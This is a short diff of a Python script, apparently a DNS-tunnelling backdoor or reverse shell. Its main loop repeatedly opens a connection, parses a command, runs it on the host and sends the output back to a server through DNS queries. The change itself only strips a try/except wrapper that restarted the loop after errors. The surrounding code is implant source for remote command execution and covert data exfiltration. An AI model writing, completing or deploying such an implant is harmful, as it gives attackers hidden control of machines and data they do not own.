@@ -128,14 +128,11 @@ def sendOutputToServer(output):
       dnsMakeQuery(url)
 
 def main():
-  try:
-    while 1:
-      a = startConnection()
-      cmd = parseCmd(a)
-      stdoutput = runCmd(cmd)
-      sendOutputToServer(stdoutput)
-  except:
-    main()
+  while 1:
+    a = startConnection()
+    cmd = parseCmd(a)
+    stdoutput = runCmd(cmd)
+    sendOutputToServer(stdoutput)
 
 if __name__ == '__main__':
   main()
